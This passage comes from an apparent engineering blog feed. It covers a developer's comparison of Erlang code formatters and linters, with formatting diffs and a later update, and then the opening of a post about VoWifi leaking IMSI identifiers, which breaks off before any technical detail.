style="color:rgb(195, 232, 141)">         parameters =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">             #{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 called_party_addr</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 #sccp_addr{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                   ...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 calling_party_addr</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 #sccp_addr{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                   ...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 data</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 #'Continue'{</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>I can't say that I easily understand what the parameters are and which
the values are with this formatting. It burns in my eyes.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="erl_tidy-and-erl_tidy"><a href="https://github.com/tsloughter/erl_tidy" target="_blank" rel="noopener noreferrer">erl_tidy</a> and <a href="http://erlang.org/doc/man/erl_tidy.html" target="_blank" rel="noopener noreferrer">erl_tidy</a><a class="hash-link" href="#erl_tidy-and-erl_tidy" title="Direct link to heading">​</a></h2><p>So I found two <code>erl_tidy</code> projects, one is included in the Erlang/OTP
libraries. The other one seems just to be a rebar3 wrapper around the
first one, so I'll just talk about the former one.</p><p>Under the hood this library uses <code>erl_prettypr:format/2</code>, which prints
the abstract syntax tree. This should work well, but gives weird
indentation problems.  For instance when it comes to records it will
not add a newline before the first field, so the lines will become
quite long, and when the lines become close to the paper width of the
document then it inserts too many newlines.</p><p>Visualising with this example again</p><div class="codeBlockContainer_I0IT language-diff theme-code-block"><div class="codeBlockContent_wNvx diff"><pre tabindex="0" class="prism-code language-diff codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">        components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">            [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">              #'Invoke'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                 invokeID = 1,linkedID = asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                 operationCode = updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                 parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                     #'UpdateLocationArg'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                        imsi = IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                        'msc-Number' = CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                        'vlr-Number' = CallingGTBCD}}}]},</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">     components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">    [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">      #'Invoke'{invokeID</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            linkedID</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            operationCode</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            parameter</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            #'UpdateLocationArg'{imsi</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         'msc-Number'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         'vlr-Number'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         CallingGTBCD}}}]},</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>There are also some issues with <code>erl_prettypr</code>; it throws an exception
when there are argumented macro functions.</p><div class="codeBlockContainer_I0IT language-erlang theme-code-block"><div class="codeBlockContent_wNvx erlang"><pre tabindex="0" class="prism-code language-erlang codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">-define(MACRO(), object).</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">foo(?MACRO()) -&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ok.</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><div class="codeBlockContainer_I0IT language-erlang theme-code-block"><div class="codeBlockContent_wNvx erlang"><pre tabindex="0" class="prism-code language-erlang codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">** exception exit: no_translation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in function  io:put_chars/3</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        called as io:put_chars(&lt;0.4843.0&gt;,unicode,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                               [...])</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in call from erl_tidy:output/4 (erl_tidy.erl, line 431)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in call from erl_tidy:write_module/3 (erl_tidy.erl, line 413)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in call from erl_tidy:file_2/2 (erl_tidy.erl, line 335)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in call from erl_tidy:file_1/3 (erl_tidy.erl, line 310)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="rebar3_format"><a href="https://github.com/AdRoll/rebar3_format" target="_blank" rel="noopener noreferrer">rebar3_format</a><a class="hash-link" href="#rebar3_format" title="Direct link to heading">​</a></h2><p>I had an issue when installing this plugin. It was not as easy as
adding <code>rebar3_format</code> to plugins in the rebar3 config. The reason I
had problems with it was that the plugin depends on
<code>inaka/katana_code</code> which for some reason did not get pulled in
properly and was missing some vital files. The issue could be resolved
by deleting the user rebar3 cache (<code>rm -rf ~/.cache/rebar3/</code>) as
explained in <a href="https://github.com/AdRoll/rebar3_format/issues/80" target="_blank" rel="noopener noreferrer">this issue</a></p><p>After installation you need to specify where the source files for
formatting can be found. This would probably not be needed if we did
not use an Erlang umberella project (an umberella project is when
there are subapplications residing in your main application).  Here is
where I found out that the command line option <code>--files
apps/**/{src,include}/*.?rl</code> is apparantly not the same as specifying
<code>{format, [{files, [“apps/**/{src,include}/*.?rl”]}]}</code> in the
config. The command line options finds only one file, while the config
parameter works as expected.</p><p>Formatting-wise it is similar to <code>erl_tidy</code>. This is because it uses
inakas <code>katana_code</code> which in its turn uses <code>erl_tidy</code>.</p><div class="codeBlockContainer_I0IT language-diff theme-code-block"><div class="codeBlockContent_wNvx diff"><pre tabindex="0" class="prism-code language-diff codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">           components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">               [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                 #'Invoke'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                    invokeID = 1,linkedID = asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                    operationCode = updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                    parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                        #'UpdateLocationArg'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                           imsi = IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                           'msc-Number' = CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                           'vlr-Number' = CallingGTBCD}}}]},</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                      components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                          [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                            #'Invoke'{invokeID = 1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                      linkedID =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                          asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                      operationCode =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                          updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                      parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                          #'UpdateLocationArg'{imsi</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                               'msc-Number'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                               'vlr-Number'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   CallingGTBCD}}}]},</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Problem is that both <code>erl_tidy</code> and <code>katana_code</code> have multiple issues
with macros. It is hard to process format code which include macros
without preprocessing the macros.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="eryngii"><a href="https://github.com/shiguredo/eryngii" target="_blank" rel="noopener noreferrer">eryngii</a><a class="hash-link" href="#eryngii" title="Direct link to heading">​</a></h2><p>This was a project I found in github. It is written in oCaml, and has
been archived by it's owner. I really do not want to install oCaml, so
I just leave it here as a reference.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="elvis"><a href="https://github.com/inaka/elvis" target="_blank" rel="noopener noreferrer">elvis</a><a class="hash-link" href="#elvis" title="Direct link to heading">​</a></h2><p>This is a bonus; it is not a formatter but a linter.</p><p>One difference between formatters and linters are that formatters
change the code into a uniform format, and linters warn or fail when
rules are broken. Linters can also check other things as nesting level.</p><p>This article by Brujo Benavides describe it pretty well.</p><p><a href="https://medium.com/@elbrujohalcon/are-formatters-better-than-linters-cbab91189be3" target="_blank" rel="noopener noreferrer">Are formatters better than linters?</a></p><p>Setting it up you need to configure a ruleset and save in a special
Elvis config file in the repo. This config specifies which linting
rules to apply to which files.</p><p>For me it took 8-9 minutes for it to execute linting on our code base
with the example ruleset that is proposed by the tool.</p><h1>Summary</h1><p>Sadly I couldn't find any good alternatives that fits our
purposes. There are issues with macros, or execution time.</p><p>I have to put this on the shelf again for a while, with just a dream
of uniform code.</p><h1>Edit: 2020-10-01</h1><p>I forgot to update this blogpost, but something amazing happend.</p><p>After I wrote this blog post I contacted the maintainer of
steamroller, and told him about the slowness I experienced, and some
other difficulties.  One day later he had found and fixed an algorithm
going from an <code>O(n^2)</code> complexity to an <code>O(n)</code>. When retrying it on our
code base, things went from minutes to seconds!</p><p>He also removed and improved some of the ambiguous configuration
parameters.</p><p>I haven't yet started to look at the map formatting issues I had, but
maybe that is improved as well. Anyway I'll have to leave that for
another hackday.</p>]]></content>
        <author>
            <name>Sebastian Weddmark Olsson</name>
            <uri>https://www.linkedin.com/in/sebastian-weddmark-olsson/</uri>
        </author>
        <category label="erlang" term="erlang"/>
        <category label="rebar3" term="rebar3"/>
        <category label="coding" term="coding"/>
        <category label="culture" term="culture"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[VoWifi leaking IMSI]]></title>
        <id>vowifi-imsi-leak/</id>
        <link href="https://www.wgtwo.com/blog/vowifi-imsi-leak/"/>
        <updated>2020-03-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[4G offers more services than the earlier generation such as 3G and 2G. One of]]></summary>
        <content type="html"><![CDATA[<p>4G offers more services than the earlier generation such as 3G and 2G. One of
the services has really have gained traction later years is VoLTE (Voice
over LTE) and VoWifi (Voice over Wifi) that we will go more in dept regarding security.</p><p>VoWifi is beneficial in terms being able to use any Wifi connection offering public
internet access thus extending and improving the coverage and connectivity.
Think of it as building our own cellular network, but
using commodity wifi components instead and avoiding the strict regulation and
licensing of spectrum.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="what-is-imsi">What is IMSI<a class="hash-link" href="#what-is-imsi" title="Direct link to heading">​</a></h2><p><em>The international mobile subscriber identity (IMSI) is a number that uniquely
identifies every user of a cellular network. It is stored as a 64-bit field
and is sent by the mobile device to the network. It is also used for acquiring
other details of the mobile in the home location register (HLR) or as locally
copied in the visitor location register. To prevent eavesdroppers from
identifying and tracking the subscriber on the radio interface, the IMSI is sent
as rarely as possible and a randomly-generated TMSI is sent instead.</em></p><ul><li><a href="https://en.wikipedia.org/wiki/International_mobile_subscriber_identity" target="_blank" rel="noopener noreferrer">IMSI article</a></li></ul><h3 class="anchor anchorWithStickyNavbar_mojV" id="security-implications">Security implications<a class="hash-link" href="#security-implications" title="Direct link to heading">​</a></h3><p>The IMSI is a secret identifier stored on the sim and can be exploited in many
